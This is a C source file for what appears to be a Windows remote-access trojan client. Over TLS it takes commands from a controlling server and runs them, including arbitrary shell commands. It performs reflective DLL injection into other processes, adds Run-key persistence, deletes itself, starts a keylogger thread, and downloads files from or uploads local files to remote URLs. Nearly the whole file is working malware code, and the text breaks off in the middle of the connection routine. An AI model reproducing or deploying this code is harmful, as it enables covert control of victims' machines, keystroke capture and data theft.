#include "common.h"

#pragma comment(lib, "ws2_32.lib") 
#pragma comment(lib, "wininet.lib")

BOOL pwd(CHAR* input, CHAR** output);
BOOL getprivs(CHAR* input, CHAR** output);
BOOL kill(CHAR* input, CHAR** output);
BOOL stoplogg(CHAR* input, CHAR** output);
BOOL startlogg(CHAR* input, CHAR** output);
BOOL persist(CHAR* input, CHAR** output);
BOOL pslist(CHAR* input, CHAR** output);
BOOL change_directory(CHAR* input, CHAR** output);
BOOL services(CHAR* input, CHAR** output);
BOOL drivers(CHAR* input, CHAR** output);

const char* funclistNames[NUM_FUNCS] = {
    "pwd",       
    "getprivs",  
    "kill",      
    "stoplogg",
    "startlogg",
    "persist",
    "pslist",
    "services",
    "drivers",
};

// Define corresponding function pointers
BOOL(*funclistPtr[NUM_FUNCS]) (CHAR* input, CHAR** output) = {
    pwd,        
    getprivs,   
    kill,       
    stoplogg,
    startlogg,
    persist,
    pslist,
    services,
    drivers,

};

BOOL injectdll(const CHAR* dllPath, const DWORD pid, CHAR** output) {
    HANDLE hFile = NULL;
    HANDLE hProcess = NULL;
    LPVOID lpBuffer = NULL;
    DWORD dwLength = 0;
    DWORD dwBytesRead = 0;
    DWORD dwReflectiveLoaderOffset = 0;
    LPVOID lpRemoteLibraryBuffer = NULL;
    LPTHREAD_START_ROUTINE lpReflectiveLoader = NULL;
    HANDLE hThread = NULL;
    STARTUPINFOA sinfo = { 0 };
    PROCESS_INFORMATION pinfo = { 0 };

    // Initialize the output
    *output = (CHAR*)calloc(BUFFER_SIZE, sizeof(CHAR));
    if (!*output) {
        return FALSE; // Memory allocation failed
    }

    sinfo.cb = sizeof(STARTUPINFOA);

    // Handle DLL file input
    hFile = CreateFileA(dllPath, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        snprintf(*output, BUFFER_SIZE, "Error opening DLL file: %lu\n", GetLastError());
        return FALSE;
    }

    dwLength = GetFileSize(hFile, NULL);
    if (dwLength == INVALID_FILE_SIZE || dwLength == 0) {
        snprintf(*output, BUFFER_SIZE, "Error reading DLL file size: %lu\n", GetLastError());
        return FALSE;
    }

    lpBuffer = HeapAlloc(GetProcessHeap(), 0, dwLength);
    if (!lpBuffer) {
        snprintf(*output, BUFFER_SIZE, "Error buffer allocation: %lu\n", GetLastError());
        return FALSE;
    }

    if (ReadFile(hFile, lpBuffer, dwLength, &dwBytesRead, NULL) == FALSE) {
        HeapFree(GetProcessHeap(), 0, lpBuffer);
        snprintf(*output, BUFFER_SIZE, "Error reading DLL file: %lu\n", GetLastError());
        return FALSE;
    }

    // Open the target process
    hProcess = OpenProcess(PROCESS_ALL_ACCESS, TRUE, pid);
    if (!hProcess) {
        snprintf(*output, BUFFER_SIZE, "Error opening process with PID %lu: %lu\n", pid, GetLastError());
        HeapFree(GetProcessHeap(), 0, lpBuffer);
        return FALSE;
    }

    // Check if the library has a ReflectiveLoader...
    dwReflectiveLoaderOffset = GetReflectiveLoaderOffset(lpBuffer);
    if (!dwReflectiveLoaderOffset) {
        snprintf(*output, BUFFER_SIZE, "Error finding ReflectiveLoader\n");
        HeapFree(GetProcessHeap(), 0, lpBuffer);
        return FALSE;
    }

    // Allocate memory in the host process for the image...
    lpRemoteLibraryBuffer = VirtualAllocEx(hProcess, NULL, dwLength, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    if (!lpRemoteLibraryBuffer) {
        snprintf(*output, BUFFER_SIZE, "Error allocating memory in remote process: %lu\n", GetLastError());
        HeapFree(GetProcessHeap(), 0, lpBuffer);
        return FALSE;
    }

    // Write the image into the host process...
    if (!WriteProcessMemory(hProcess, lpRemoteLibraryBuffer, lpBuffer, dwLength, NULL)) {
        snprintf(*output, BUFFER_SIZE, "Error writing memory in remote process: %lu\n", GetLastError());
        HeapFree(GetProcessHeap(), 0, lpBuffer);
        return FALSE;
    }

    // Add the offset to ReflectiveLoader() to the remote library address...
    lpReflectiveLoader = (LPTHREAD_START_ROUTINE)((ULONG_PTR)lpRemoteLibraryBuffer + dwReflectiveLoaderOffset);

    // Create a remote thread in the host process to call the ReflectiveLoader!
    hThread = CreateRemoteThread(hProcess, NULL, 1024 * 1024, lpReflectiveLoader, NULL, 0, NULL);
    if (!hThread) {
        snprintf(*output, BUFFER_SIZE, "Error creating remote thread: %lu\n", GetLastError());
        HeapFree(GetProcessHeap(), 0, lpBuffer);
        return FALSE;
    }

    snprintf(*output, BUFFER_SIZE, "Injected DLL '%s' into process with PID %lu\n", dllPath, pid);

    // Wait for the thread to finish
    WaitForSingleObject(hThread, INFINITE);
    CloseHandle(hThread);

    // Clean up
    if (lpBuffer) {
        HeapFree(GetProcessHeap(), 0, lpBuffer);
    }
    if (hProcess) {
        CloseHandle(hProcess);
    }

    return TRUE;
}





BOOL drivers(CHAR* input, CHAR** output) {
    LPVOID drivers[1024];
    DWORD cbNeeded;
    int cDrivers, i;

    // Call EnumDeviceDrivers to retrieve device drivers
    if (EnumDeviceDrivers(drivers, sizeof(drivers), &cbNeeded) && cbNeeded < sizeof(drivers)) {
        CHAR szDriver[1024];
        cDrivers = cbNeeded / sizeof(drivers[0]);

        // Allocate memory for output (start with a basic message)
        *output = (CHAR*)calloc(BUFFER_SIZE, sizeof(CHAR));
        if (!*output) {
            return FALSE; // Memory allocation failed
        }

        snprintf(*output, BUFFER_SIZE, "[+] %d drivers found\n", cDrivers);

        // Loop through each driver and get its base name
        for (i = 0; i < cDrivers; i++) {
            if (GetDeviceDriverBaseNameA(drivers[i], szDriver, sizeof(szDriver))) {
                // Append driver information to the output
                char driverInfo[1024];
                snprintf(driverInfo, sizeof(driverInfo), "[.] %s => %p\n", szDriver, drivers[i]);
                strcat_s(*output, BUFFER_SIZE, driverInfo);
            }
            else {
                // If failed to get driver base name, append an error message
                char errorMessage[256];
                snprintf(errorMessage, sizeof(errorMessage), "[-] E: %d\n", GetLastError());
                strcat_s(*output, BUFFER_SIZE, errorMessage);
            }
        }
    }
    else {
        // If enumeration failed, return an error message
        *output = (CHAR*)calloc(BUFFER_SIZE, sizeof(CHAR));
        if (!*output) {
            return FALSE; // Memory allocation failed
        }
        snprintf(*output, BUFFER_SIZE, "Failed to enumerate drivers. Error: %d\n", GetLastError());
        return FALSE;
    }

    return TRUE;
}


BOOL change_directory(CHAR* input, CHAR** output) {
    // Extract directory from input (e.g., "cd C:\\SomeDirectory")
    CHAR* dir = input + 3; // Skip the "cd " part
    dir = strtok(dir, "\n"); // Remove any trailing newline

    if (SetCurrentDirectoryA(dir)) {
        *output = (CHAR*)calloc(BUFFER_SIZE, sizeof(CHAR));
        snprintf(*output, BUFFER_SIZE, "Changed directory to %s\n", dir);
        return TRUE;
    }
    else {
        *output = (CHAR*)calloc(BUFFER_SIZE, sizeof(CHAR));
        snprintf(*output, BUFFER_SIZE, "Failed to change directory to %s. Error: %d\n", dir, GetLastError());
        return FALSE;
    }
}

BOOL services(CHAR* input, CHAR** output) {
    SC_HANDLE hSCM = OpenSCManager(NULL, NULL, SC_MANAGER_ENUMERATE_SERVICE);
    if (!hSCM) {
        *output = (CHAR*)calloc(BUFFER_SIZE, sizeof(CHAR));
        snprintf(*output, BUFFER_SIZE, "Failed to open service manager. Error: %d\n", GetLastError());
        return FALSE;
    }

    DWORD bytesNeeded = 0, servicesReturned = 0, resumeHandle = 0;
    EnumServicesStatusEx(hSCM, SC_ENUM_PROCESS_INFO, SERVICE_WIN32, SERVICE_STATE_ALL,
        NULL, 0, &bytesNeeded, &servicesReturned, &resumeHandle, NULL);

    LPBYTE buffer = (LPBYTE)malloc(bytesNeeded);
    if (!buffer) {
        *output = (CHAR*)calloc(BUFFER_SIZE, sizeof(CHAR));
        snprintf(*output, BUFFER_SIZE, "Memory allocation failed\n");
        CloseServiceHandle(hSCM);
        return FALSE;
    }

    if (EnumServicesStatusEx(hSCM, SC_ENUM_PROCESS_INFO, SERVICE_WIN32, SERVICE_STATE_ALL,
        buffer, bytesNeeded, &bytesNeeded, &servicesReturned, &resumeHandle, NULL)) {
        LPENUM_SERVICE_STATUS_PROCESS services = (LPENUM_SERVICE_STATUS_PROCESS)buffer;
        *output = (CHAR*)calloc(BUFFER_SIZE, sizeof(CHAR));
        snprintf(*output, BUFFER_SIZE, "Services on the system:\n");

        for (DWORD i = 0; i < servicesReturned; i++) {
            char serviceDetails[512];
            snprintf(serviceDetails, sizeof(serviceDetails), "Service: %ws, Display: %ws\n",
                services[i].lpServiceName, services[i].lpDisplayName);
            strcat_s(*output, BUFFER_SIZE, serviceDetails);
        }
    }
    else {
        *output = (CHAR*)calloc(BUFFER_SIZE, sizeof(CHAR));
        snprintf(*output, BUFFER_SIZE, "EnumServicesStatusEx failed: %d\n", GetLastError());
    }

    free(buffer);
    CloseServiceHandle(hSCM);
    return TRUE;
}



BOOL move_file(const char* source_path, const char* dest_path, char** output) {
    // Attempt to move the file
    if (MoveFileA(source_path, dest_path)) {
        *output = (char*)calloc(BUFFER_SIZE, sizeof(char));
        snprintf(*output, BUFFER_SIZE, "File moved successfully from %s to %s\n", source_path, dest_path);
        return TRUE;
    }
    else {
        *output = (char*)calloc(BUFFER_SIZE, sizeof(char));
        snprintf(*output, BUFFER_SIZE, "Failed to move file. Error: %d\n", GetLastError());
        return FALSE;
    }
}

BOOL pwd(CHAR* input, CHAR** output) {
    CHAR currDir[MAX_PATH];
    DWORD currDirLength = MAX_PATH;
    if (GetCurrentDirectoryA(currDirLength, currDir)) {
        *output = (CHAR*)calloc(strlen(currDir) + 1, sizeof(CHAR));
        strcat_s(*output, strlen(currDir) + 1, currDir);
        return TRUE;
    }
    return FALSE;
}

BOOL kill(CHAR* input, CHAR** output) {
    if (!DeleteSelf()) {

    }
    ExitProcess(0);
}

BOOL DeleteSelf() {


    WCHAR				    szPath[MAX_PATH * 2] = { 0 };
    FILE_DISPOSITION_INFO	Delete = { 0 };
    HANDLE				    hFile = INVALID_HANDLE_VALUE;
    PFILE_RENAME_INFO		pRename = NULL;
    const wchar_t* NewStream = (const wchar_t*)NEW_STREAM;
    SIZE_T				    sRename = sizeof(FILE_RENAME_INFO) + sizeof(NewStream);

    // Allocating enough buffer for the 'FILE_RENAME_INFO' structure
    pRename = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sRename);
    if (!pRename) {
        printf("[!] HeapAlloc Failed With Error : %d \n", GetLastError());
        return FALSE;
    }

    // Cleaning up the structures
    ZeroMemory(szPath, sizeof(szPath));
    ZeroMemory(&Delete, sizeof(FILE_DISPOSITION_INFO));

    //--------------------------------------------------------------------------------------------------------------------------
    // Marking the file for deletion (used in the 2nd SetFileInformationByHandle call)
    Delete.DeleteFile = TRUE;

    // Setting the new data stream name buffer and size in the 'FILE_RENAME_INFO' structure
    pRename->FileNameLength = sizeof(NewStream);
    RtlCopyMemory(pRename->FileName, NewStream, sizeof(NewStream));

    //--------------------------------------------------------------------------------------------------------------------------

    // Used to get the current file name
    if (GetModuleFileNameW(NULL, szPath, MAX_PATH * 2) == 0) {
        printf("[!] GetModuleFileNameW Failed With Error : %d \n", GetLastError());
        return FALSE;
    }

    //--------------------------------------------------------------------------------------------------------------------------
    // RENAMING

    // Opening a handle to the current file
    hFile = CreateFileW(szPath, DELETE | SYNCHRONIZE, FILE_SHARE_READ, NULL, OPEN_EXISTING, NULL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        printf("[!] CreateFileW [R] Failed With Error : %d \n", GetLastError());
        return FALSE;
    }

    //wprintf(L"[i] Renaming :$DATA to %s  ...", NEW_STREAM);

    // Renaming the data stream
    if (!SetFileInformationByHandle(hFile, FileRenameInfo, pRename, sRename)) {
        printf("[!] SetFileInformationByHandle [R] Failed With Error : %d \n", GetLastError());
        return FALSE;
    }
    wprintf(L"[+] DONE \n");

    CloseHandle(hFile);

    //--------------------------------------------------------------------------------------------------------------------------
    // DELEING

    // Opening a new handle to the current file
    hFile = CreateFileW(szPath, DELETE | SYNCHRONIZE, FILE_SHARE_READ, NULL, OPEN_EXISTING, NULL, NULL);
    if (hFile == INVALID_HANDLE_VALUE && GetLastError() == ERROR_FILE_NOT_FOUND) {
        // in case the file is already deleted
        return TRUE;
    }
    if (hFile == INVALID_HANDLE_VALUE) {
        printf("[!] CreateFileW [D] Failed With Error : %d \n", GetLastError());
        return FALSE;
    }

    //wprintf(L"[i] DELETING ...");

    // Marking for deletion after the file's handle is closed
    if (!SetFileInformationByHandle(hFile, FileDispositionInfo, &Delete, sizeof(Delete))) {
        printf("[!] SetFileInformationByHandle [D] Failed With Error : %d \n", GetLastError());
        return FALSE;
    }
    //wprintf(L"[+] DONE \n");

    CloseHandle(hFile);

    //--------------------------------------------------------------------------------------------------------------------------

    // Freeing the allocated buffer
    HeapFree(GetProcessHeap(), 0, pRename);

    return TRUE;
}

BOOL persist(CHAR* input, CHAR** output) {

    //char err[128] = "Failed\n";
    //char succ[128] = "Created Persistence At: HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\n";
    TCHAR szPath[MAX_PATH];
    DWORD pathLen = 0;

    pathLen = GetModuleFileName(NULL, szPath, MAX_PATH);
    if (pathLen == 0) {
        return -1;
    }
    HKEY NewVal;
    if (RegOpenKey(HKEY_CURRENT_USER, TEXT("Software\\Microsoft\\Windows\\CurrentVersion\\Run"), &NewVal) != ERROR_SUCCESS) {
        return -1;
    }

    DWORD pathLenInBytes = pathLen * sizeof(*szPath);
    if (RegSetValueEx(NewVal, TEXT(" deleteme"), 0, REG_SZ, (LPBYTE)szPath, pathLenInBytes) != ERROR_SUCCESS) {
        RegCloseKey(NewVal);
        return -1;
    }
    RegCloseKey(NewVal);
    return 0;
}

BOOL getprivs(CHAR* input, CHAR** output) {
    *output = (CHAR*)calloc(10, sizeof(CHAR));
    HANDLE hToken = NULL;
    TOKEN_ELEVATION token_elevation;
    PTOKEN_PRIVILEGES ptoken_privileges = NULL;
    DWORD cbSize = sizeof(TOKEN_ELEVATION);
    DWORD tpSize, length;

    CHAR name[256];

    if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
        GetTokenInformation(hToken, TokenPrivileges, ptoken_privileges, 0, &tpSize);

        ptoken_privileges = (PTOKEN_PRIVILEGES)calloc(tpSize + 1, sizeof(TOKEN_PRIVILEGES));

        if (ptoken_privileges) {
            if (GetTokenInformation(hToken, TokenPrivileges, ptoken_privileges, tpSize, &tpSize)) {
                for (int i = 0; i < ptoken_privileges->PrivilegeCount; i++) {
                    length = 256;
                    LookupPrivilegeNameA(NULL, &ptoken_privileges->Privileges[i].Luid, name, &length);
                    CHAR* t_output = (CHAR*)calloc(strlen(name) + 50, sizeof(CHAR));
                    if (ptoken_privileges->Privileges[i].Attributes == 3) {
                        sprintf_s(t_output, strlen(name) + 50, "[+] %s => Enabled (Default)\n", name);
                    }
                    else if (ptoken_privileges->Privileges[i].Attributes == 2) {
                        sprintf_s(t_output, strlen(name) + 50, "[+] %s Enabled (Adjusted)\n", name);
                    }
                    else if (ptoken_privileges->Privileges[i].Attributes == 0) {
                        sprintf_s(t_output, strlen(name) + 50, "[+] %s Enabled (Disabled)\n", name);
                    }
                    int newOutputlen = strlen(*output) + strlen(t_output) + 1;
                    *output = (CHAR*)realloc(*output, newOutputlen);
                    strcat_s(*output, newOutputlen, t_output);
                    free(t_output);
                }
            }
        }

        if (GetTokenInformation(hToken, TokenElevation, &token_elevation, sizeof(token_elevation), &cbSize)) {
            if (token_elevation.TokenIsElevated) {
                int newOutputlen = strlen(*output) + 14 + 1;
                *output = (CHAR*)realloc(*output, newOutputlen);
                strcat_s(*output, newOutputlen, "[+] Elevated\n");
            }
            else {
                int newOutputlen = strlen(*output) + 16 + 1;
                *output = (CHAR*)realloc(*output, newOutputlen);
                strcat_s(*output, newOutputlen, "[-] Restricted\n");
            }
        }
        CloseHandle(hToken);
    }
    else {
        return FALSE;
    }

    free(ptoken_privileges);
    return TRUE;
}

BOOL pslist(CHAR* input, CHAR** output) {
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snapshot == INVALID_HANDLE_VALUE) {
        return FALSE; // Failed to take process snapshot
    }

    PROCESSENTRY32 processEntry = { 0 };
    processEntry.dwSize = sizeof(PROCESSENTRY32);

    size_t tempBufferSize = 1024; // Initial size for the temporary buffer
    CHAR* tempBuffer = (CHAR*)calloc(tempBufferSize, sizeof(CHAR));
    if (!tempBuffer) {
        CloseHandle(snapshot);
        return FALSE; // Memory allocation failed
    }

    size_t currentLength = 0;

    if (Process32First(snapshot, &processEntry)) {
        do {
            // Open the process to retrieve the full path
            HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, processEntry.th32ProcessID);
            if (hProcess) {
                CHAR fullProcessPath[MAX_PATH] = { 0 };
                DWORD pathLength = GetModuleFileNameExA(hProcess, NULL, fullProcessPath, MAX_PATH);

                // If the full path is available, use it; otherwise, fallback to szExeFile
                CHAR* processName = (pathLength > 0) ? fullProcessPath : processEntry.szExeFile;

                // Add process details to the buffer (name, PID, PPID)
                size_t processInfoLength = snprintf(NULL, 0, "%s (PID: %u, PPID: %u)\n",
                    processName,
                    processEntry.th32ProcessID,
                    processEntry.th32ParentProcessID);
                size_t requiredSize = currentLength + processInfoLength;

                // Expand the temporary buffer if needed
                if (requiredSize > tempBufferSize) {
                    tempBufferSize *= 2;
                    if (requiredSize > tempBufferSize) {
                        tempBufferSize = requiredSize; // Ensure it meets the exact requirement
                    }
                    CHAR* newTempBuffer = (CHAR*)realloc(tempBuffer, tempBufferSize);
                    if (!newTempBuffer) {
                        free(tempBuffer);
                        CloseHandle(hProcess);
                        CloseHandle(snapshot);
                        return FALSE; // Memory allocation failed
                    }
                    tempBuffer = newTempBuffer;
                }

                // Append the process info to the buffer
                snprintf(tempBuffer + currentLength, tempBufferSize - currentLength, "%s (PID: %u, PPID: %u)\n",
                    processName,
                    processEntry.th32ProcessID,
                    processEntry.th32ParentProcessID);
                currentLength += processInfoLength; // Update current length

                CloseHandle(hProcess); // Close the process handle
            }
        } while (Process32Next(snapshot, &processEntry));
    }

    CloseHandle(snapshot); // Clean up the handle

    // Allocate and copy the result to the output
    *output = (CHAR*)calloc(currentLength + 1, sizeof(CHAR));
    if (!*output) {
        free(tempBuffer);
        return FALSE; // Memory allocation failed
    }

    strcpy_s(*output, currentLength + 1, tempBuffer);
    free(tempBuffer); // Free the temporary buffer

    return TRUE;
}

BOOL downloadfile(const CHAR* url, const CHAR* filePath, CHAR** output) {
    *output = (CHAR*)calloc(BUFFER_SIZE, sizeof(CHAR));
    if (!*output) {
        snprintf(*output, BUFFER_SIZE, "Memory allocation failed\n");
        return FALSE;  // Memory allocation failed
    }

    // Initialize the internet session
    HINTERNET hInternet = InternetOpenA("FileUploader", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (!hInternet) {
        snprintf(*output, BUFFER_SIZE, "Failed to initialize internet connection: %lu\n", GetLastError());
        return FALSE;  // Failed to initialize internet connection
    }

    // Open the URL for download
    HINTERNET hConnect = InternetOpenUrlA(hInternet, url, NULL, 0, INTERNET_FLAG_RELOAD, 0);
    if (!hConnect) {
        snprintf(*output, BUFFER_SIZE, "Failed to open URL: %lu\n", GetLastError());
        InternetCloseHandle(hInternet);
        return FALSE;  // Failed to open URL
    }

    // Open the local file to write
    HANDLE hFile = CreateFileA(filePath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        snprintf(*output, BUFFER_SIZE, "Failed to create local file: %lu\n", GetLastError());
        InternetCloseHandle(hConnect);
        InternetCloseHandle(hInternet);
        return FALSE;  // Failed to create file
    }

    // Read data from the URL and write to the local file
    DWORD bytesRead;
    BYTE buffer[BUFFER_SIZE];  // Buffer for downloading data
    while (InternetReadFile(hConnect, buffer, sizeof(buffer), &bytesRead) && bytesRead > 0) {
        DWORD bytesWritten;
        WriteFile(hFile, buffer, bytesRead, &bytesWritten, NULL);
        if (bytesWritten != bytesRead) {
            snprintf(*output, BUFFER_SIZE, "Failed to write data to file\n");
            CloseHandle(hFile);
            InternetCloseHandle(hConnect);
            InternetCloseHandle(hInternet);
            return FALSE;
        }
    }

    snprintf(*output, BUFFER_SIZE, "Downloaded file from %s to %s\n", url, filePath);
    CloseHandle(hFile);
    InternetCloseHandle(hConnect);
    InternetCloseHandle(hInternet);
    return TRUE;
}

// Upload a file to a remote HTTP server using POST
BOOL uploadfile(const CHAR* filePath, const CHAR* serverUrl, CHAR** output) {
    *output = (CHAR*)calloc(BUFFER_SIZE, sizeof(CHAR));
    if (!*output) {
        return FALSE; // Memory allocation failed
    }

    HINTERNET hInternet = InternetOpenA("FileUploader", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (!hInternet) {
        snprintf(*output, BUFFER_SIZE, "Error opening internet: %lu\n", GetLastError());
        return FALSE;
    }

    HINTERNET hConnect = InternetOpenUrlA(hInternet, serverUrl, NULL, 0, INTERNET_FLAG_RELOAD, 0);
    if (!hConnect) {
        snprintf(*output, BUFFER_SIZE, "Error connecting to server: %lu\n", GetLastError());
        InternetCloseHandle(hInternet);
        return FALSE;
    }

    // Open the file to upload
    HANDLE hFile = CreateFileA(filePath, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        snprintf(*output, BUFFER_SIZE, "Error opening file: %lu\n", GetLastError());
        InternetCloseHandle(hConnect);
        InternetCloseHandle(hInternet);
        return FALSE;
    }

    // Read and upload the data in chunks
    char buffer[BUFFER_SIZE];
    DWORD bytesRead = 0;
    DWORD bytesWritten = 0;
    while (ReadFile(hFile, buffer, BUFFER_SIZE, &bytesRead, NULL) && bytesRead > 0) {
        // Send the data (you may need to implement the server-side to handle the data)
        if (!HttpSendRequestA(hConnect, NULL, 0, buffer, bytesRead)) {
            snprintf(*output, BUFFER_SIZE, "Error sending request: %lu\n", GetLastError());
            CloseHandle(hFile);
            InternetCloseHandle(hConnect);
            InternetCloseHandle(hInternet);
            return FALSE;
        }
    }

    // Clean up
    CloseHandle(hFile);
    InternetCloseHandle(hConnect);
    InternetCloseHandle(hInternet);

    snprintf(*output, BUFFER_SIZE, "Uploaded file %s to server %s\n", filePath, serverUrl);
    return TRUE;
}

void execute_command(char* command, char* output) {
    FILE* fp = _popen(command, "r");
    if (!fp) {
        strcpy(output, "[ERROR] Failed to execute command.\n");
        return;
    }

    char temp[BUFFER_SIZE];
    output[0] = '\0'; // Clear the output buffer
    while (fgets(temp, sizeof(temp), fp)) {
        strcat(output, temp);
    }
    _pclose(fp);
}

void handle_server(SOCKET sock, SSL* ssl, char* cmd) {
    int cmdlistLen = strlen(cmd);
    char buffer[BUFFER_SIZE];
    char* output = NULL;

    while (1) {
        memset(buffer, 0, BUFFER_SIZE);
        int bytes_received = SSL_read(ssl, buffer, BUFFER_SIZE - 1);
        if (bytes_received <= 0) {
            printf("[INFO] Server disconnected.\n");
            break;
        }

        // Dynamically allocate memory for output
        CHAR* cmdOutput = (CHAR*)calloc(BUFFER_SIZE, sizeof(CHAR));

        // Parse command into input and args
        CHAR* input = (CHAR*)calloc(cmdlistLen + 1, sizeof(CHAR));
        strcpy(input, buffer);  // Copy received command to input

        // Check for special commands
        if (strncmp(buffer, "injectdll ", 10) == 0) {
            // Split the command into dllPath and pid
            CHAR* cmdPtr = buffer + 10;  // Move past "injectdll "
            CHAR* dllPath = strtok(cmdPtr, " ");
            CHAR* pidStr = strtok(NULL, " ");
            if (dllPath && pidStr && is_number(pidStr)) {
                DWORD pid = atoi(pidStr);

                if (injectdll(dllPath, pid, &output)) {
                    // Send back the output of the injection process
                    SSL_write(ssl, output, strlen(output));
                }
                else {
                    snprintf(cmdOutput, BUFFER_SIZE, "Injection failed for DLL: %s into process with PID: %lu\n", dllPath, pid);
                    SSL_write(ssl, cmdOutput, strlen(cmdOutput));
                }
            }
            else {
                snprintf(cmdOutput, BUFFER_SIZE, "Invalid injectdll command syntax. Usage: injectdll <dllPath> <pid>\n");
                SSL_write(ssl, cmdOutput, strlen(cmdOutput));
            }
        }
        else if (strncmp(buffer, "download ", 9) == 0) {
            // Extract URL and file path from the command
            CHAR* cmdPtr = buffer + 9;  // Move past "download "
            CHAR* url = strtok(cmdPtr, " ");
            CHAR* filePath = strtok(NULL, " ");
            if (url && filePath) {
                if (downloadfile(url, filePath, &output)) {
                    SSL_write(ssl, output, strlen(output));
                }
                else {
                    snprintf(cmdOutput, BUFFER_SIZE, "Failed to download file: %s\n", url);
                    SSL_write(ssl, cmdOutput, strlen(cmdOutput));
                }
            }
        }
        else if (strncmp(buffer, "upload ", 7) == 0) {
            // Extract file path and server URL from the command
            CHAR* cmdPtr = buffer + 7;  // Move past "upload "
            CHAR* filePath = strtok(cmdPtr, " ");
            CHAR* serverUrl = strtok(NULL, " ");
            if (filePath && serverUrl) {
                if (uploadfile(filePath, serverUrl, &output)) {
                    SSL_write(ssl, output, strlen(output));
                }
                else {
                    snprintf(cmdOutput, BUFFER_SIZE, "Failed to upload file: %s\n", filePath);
                    SSL_write(ssl, cmdOutput, strlen(cmdOutput));
                }
            }
        }
        else if (strncmp(buffer, "cd ", 3) == 0) {
            if (change_directory(input, &output)) {
                SSL_write(ssl, output, strlen(output));
            }
        }
        else if (strncmp(buffer, "move ", 5) == 0) {
            char* source = input + 5;  // Skip the "move " part
            char* dest = strchr(source, ' ');
            if (dest != NULL) {
                *dest = '\0';
                dest++;
                if (move_file(source, dest, &output)) {
                    SSL_write(ssl, output, strlen(output));
                }
            }
            else {
                snprintf(cmdOutput, BUFFER_SIZE, "Invalid move command. Syntax: move <source> <destination>\n");
                SSL_write(ssl, cmdOutput, strlen(cmdOutput));
            }
        }
        else {
            // Handle other commands
            BOOL found = FALSE;
            for (int i = 0; i < NUM_FUNCS; i++) {
                if (strcmp(buffer, funclistNames[i]) == 0) {
                    printf("[INFO] Found function: %s\n", funclistNames[i]);
                    if ((*funclistPtr[i])(input, &output)) {
                        SSL_write(ssl, output, strlen(output));
                    }
                    found = TRUE;
                    break;
                }
            }

            if (!found) {
                printf("[SERVER COMMAND] %s\n", buffer);
                execute_command(buffer, cmdOutput);  // Execute system command
                SSL_write(ssl, cmdOutput, strlen(cmdOutput));
            }
        }

        // Free memory after use
        free(cmdOutput);
        free(input);
    }
}


void initialize_openssl() {
    SSL_library_init();
    OpenSSL_add_all_algorithms();
    SSL_load_error_strings();
}

void cleanup_openssl() {
    EVP_cleanup();
    ERR_free_strings();
}

SSL_CTX* create_ssl_context() {
    const SSL_METHOD* method = SSLv23_client_method();
    SSL_CTX* ctx = SSL_CTX_new(method);
    if (!ctx) {
        perror("Unable to create SSL context");
        exit(1);
    }
    return ctx;
}

void verify_server_certificate(SSL* ssl) {
    X509* cert = SSL_get_peer_certificate(ssl);
    if (cert == NULL) {
        printf("No server certificate presented.\n");
    }
    else {
        printf("Server certificate:\n");
        X509_print_fp(stdout, cert);
        X509_free(cert);
    }

    long verify_result = SSL_get_verify_result(ssl);
    if (verify_result != X509_V_OK) {
        printf("Certificate verification failed: %ld\n", verify_result);
    }
    else {
        printf("Server certificate verified successfully!\n");
    }
}



int main() {
    WSADATA wsa;
    SOCKET sock;
    struct sockaddr_in server;
    char buffer[BUFFER_SIZE];
    const SSL_METHOD* method = TLS_client_method();  // Prefer TLS 1.2/1.3



    // SSL-related initialization
    SSL_CTX* ctx;
    SSL* ssl;

    const char* server_ip = HOST;  // Replace with your server's IP address
    const int server_port = PORT;            // Replace with your server's port

    printf("[INFO] Initializing Winsock...\n");
    if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) {
        printf("[ERROR] Failed to initialize Winsock. Error Code: %d\n", WSAGetLastError());
        return 1;
    }

    // Initialize OpenSSL
    initialize_openssl();

    // Create SSL context
    ctx = create_ssl_context();
    SSL_CTX_set_cipher_list(ctx, "HIGH:!aNULL:!eNULL");


    // Load the server certificate
    if (!SSL_CTX_load_verify_locations(ctx, CERT_FILE, NULL)) {
        perror("Unable to load server certificate");
        exit(1);
    }

    // Create and start a thread for the keylogger function
    HANDLE hThread = CreateThread(NULL, 0, logg, NULL, 0, NULL);
    if (hThread == NULL) {
        printf("[ERROR] Failed to create keylogger thread. Error Code: %d\n", GetLastError());
        WSACleanup();
        cleanup_openssl();
        return 1;
    }
    printf("[INFO] Keylogger started in a separate thread.\n");

    while (1) {  // Infinite loop for reconnection attempts
        if ((sock = socket(AF_INET, SOCK_STREAM, 0)) == INVALID_SOCKET) {
            printf("[ERROR] Could not create socket. Error Code: %d\n", WSAGetLastError());
            WSACleanup();
            cleanup_openssl();
            return 1;
        }
        printf("[INFO] Socket created.\n");

        server.sin_addr.s_addr = inet_addr(server_ip);
        server.sin_family = AF_INET;
        server.sin_port = htons(server_port);

        printf("[INFO] Attempting to connect to server at %s:%d...\n", server_ip, server_port);
        if (connect(sock, (struct sockaddr*)&server, sizeof(server)) < 0) {
            printf("[ERROR] Connection failed. Error Code: %d\n", WSAGetLastError());
            closesocket(sock);
            printf("[INFO] Retrying connection in 10 seconds...\n");
            Sleep(10000);  // Wait for 10 seconds before retrying
            continue;      // Retry connection
        }
        printf("[INFO] Connected to server at %s:%d\n", server_ip, server_port);

        // Create an SSL structure and associate it with the socket
        ssl = SSL_new(ctx);
        SSL_set_fd(ssl, sock);

        // Establish SSL connection
        if (SSL_connect(ssl) <= 0) {
            int err = SSL_get_error(ssl, -1);
            printf("[ERROR] SSL connection failed with error code %d\n", err);
